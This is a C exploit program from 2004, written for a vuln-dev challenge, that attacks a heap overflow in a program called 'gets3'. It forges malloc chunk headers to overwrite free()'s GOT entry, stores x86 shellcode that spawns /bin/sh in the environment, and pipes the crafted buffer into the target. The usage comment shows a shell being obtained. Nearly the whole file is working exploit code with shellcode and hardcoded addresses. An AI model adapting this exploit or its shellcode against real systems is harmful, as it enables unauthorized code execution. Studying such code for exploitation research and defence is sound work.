/*
 * $Id: gets3-ex3.c,v 1.1 2004/09/15 17:54:39 raptor Exp $
 *
 * gets3-ex3.c - vuln-dev challenge by <fuzzy@bonbon.net>
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * A final C porting of the sh/perl exploit posted by <fuzzy@bonbon.net> on
 * the vuln-dev list (see http://www.securityfocus.com/archive/82/375056).
 * This time, we return into the environment using popen() and fwrite(): the
 * exploit will need some tweakings to work on your system (see TUNING macro).
 *
 * That's not going to work on systems with non-executable stack protection.
 *
 * Buffer structure:
 * [padding] [0x00000000] [0x00000108] [FREE - 12] [ret]
 *
 * Usage:
 * $ uname -a
 * Linux karma 2.4.18-1-686-smp #1 SMP Wed Apr 14 18:42:49 UTC 2004 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ gcc gets3-ex3.c -o gets3-ex3  
 * $ ./gets3-ex3
 * Using free() address    : 0x8049698
 * Using ret address       : 0xbfffff9d
 * buf1: 0x80496c0
 * buf2: 0x80497c8
 * sh-2.05a$ 
 */ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define	VULN		"./gets3	// the vulnerable program
#define BUFSIZE		256 + 16 + 1	// size of the evil buffer
#define FREE		0x08049698	// free() address in .got
#define	TUNING		14		// system-dependant tuning

char sc[] = /* linux/x86 special shellcode */
"\xeb\x0bWHO_CARES??"
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
	char		buf[BUFSIZE], *p = buf;
	int		ret;
	FILE		*vuln;

	extern char 	**environ;
	char		**ep = environ;
	char		*vp;
	int		env_size = 0;

	/* clean-up the environment */
	while (*ep) {
		vp = strchr(*ep, '=');
		*vp = 0x0;
		unsetenv(*ep);
		*ep = NULL;
		*ep++;
	}

	/* put the special shellcode in envp */
	setenv("SC", sc, 1);
	env_size = strlen(sc) + 1 + strlen("SC") + 1;

	/* calculate retaddr */
	ret = 0xbffffffa - env_size - strlen(VULN) - TUNING;

	/* padding */
	memset(p, 'A', 256);
	p += 256;

	/* prev_size field */
	memset(p, 0, 4);
	p += 4;

	/* size field */
	*((void **)p) = (void *)(256 + 8);
	p += 4;

	/* fd field */
	*((void **)p) = (void *)(FREE - 12);
	p += 4;

	/* bk field */
	*((void **)p) = (void *)(ret);
	p += 4;

	/* newline */
	*p = 0x0a;

	/* print some output */
	fprintf(stderr, "Using free() address\t: %p\n", (void *)FREE);
	fprintf(stderr, "Using ret address\t: %p\n", (void *)ret);

	/* run the vulnerable program */
	vuln = popen(VULN, "w");
	fwrite(buf, sizeof(buf), 1, vuln);
	pclose(vuln);

	exit(0);
}
